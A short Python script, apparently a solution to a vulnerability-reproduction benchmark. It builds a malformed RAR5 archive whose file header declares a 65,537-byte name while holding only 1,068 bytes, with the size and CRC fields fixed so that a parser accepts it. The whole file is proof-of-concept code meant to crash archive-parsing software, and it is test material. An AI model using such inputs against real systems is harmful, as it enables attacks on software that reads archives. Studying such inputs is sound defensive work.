import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper to encode a variable-length integer as per RAR5
        def encode_varint(value: int) -> bytes:
            buf = bytearray()
            while value >= 0x80:
                buf.append((value & 0x7F) | 0x80)
                value >>= 7
            buf.append(value)
            return bytes(buf)

        # Archive header (RAR5 signature)
        archive_header = b'Rar!\x1A\x07\x01\x00'

        # File header parameters
        header_type = 3          # File header
        flags = 0                # No extra area, no data area
        file_attr = 0
        mod_time = 0
        name_len = 0x10001       # Exceeds typical limit (65537)
        # We'll adjust name_bytes length to get total PoC size 1089
        # Compute required lengths
        # Rest part without name bytes:
        rest_fixed = (encode_varint(header_type) + encode_varint(flags) +
                      encode_varint(file_attr) + encode_varint(mod_time) +
                      encode_varint(name_len))
        # Length of fixed rest part
        fixed_len = len(rest_fixed)   # 1+1+1+1+3 = 7
        # We want total archive = 1089 bytes
        # archive_header = 8, so file header must be 1081 bytes
        L = 1081                     # Total file header size
        # Solve for name_bytes length:
        # L = 4 (CRC) + len(size_enc) + fixed_len + name_bytes_len
        # We know size_enc for L=1081 is 2 bytes (0xB9 0x08)
        size_enc_len = 2
        name_bytes_len = L - 4 - size_enc_len - fixed_len  # 1081 - 4 - 2 - 7 = 1068
        name_bytes = b'A' * name_bytes_len

        # Build the rest of the header (after CRC and size)
        rest = rest_fixed + name_bytes

        # Encode header size L
        size_enc = encode_varint(L)   # Should be b'\xb9\x08'

        # Compute CRC over the header data (size_enc + rest)
        crc_data = size_enc + rest
        crc = zlib.crc32(crc_data) & 0xFFFFFFFF
        crc_bytes = struct.pack('<I', crc)

        # Assemble file header
        file_header = crc_bytes + crc_data

        # Final PoC: archive header + file header
        poc = archive_header + file_header
        return poc